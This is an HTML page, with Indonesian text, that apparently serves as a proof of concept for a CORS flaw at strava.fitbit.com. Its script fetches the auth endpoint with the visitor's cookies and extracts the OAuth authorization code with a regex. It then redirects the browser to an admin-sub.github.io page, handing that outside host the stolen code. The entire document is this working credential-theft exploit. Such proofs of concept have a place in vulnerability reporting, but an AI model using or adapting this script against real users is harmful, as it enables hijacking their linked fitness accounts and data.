<html>
  <head>
    <title>Fetch Fitbit OAuth Code</title>
  </head>
  <body>
    <h2>Ambil kode OAuth dari strava.fitbit.com</h2>

    <script>
      fetch("https://strava.fitbit.com/auth/fitbit", {
        method: "GET",
        credentials: "include",
        mode: "cors",
        headers: {
          Origin: "https://admin-sub.github.io"
        }
      })
      .then(res => res.text())
      .then(html => {
        const match = html.match(/code=([\w-]+)/);
        const code = match ? match[1] : null;

        if (code) {
          location.href = "https://admin-sub.github.io/fitbit-cors-poc/?code=" + code;
        } else {
          alert("Kode tidak ditemukan di response.");
        }
      })
      .catch(err => {
        console.error("Gagal fetch:", err);
      });
    </script>
  </body>
</html>

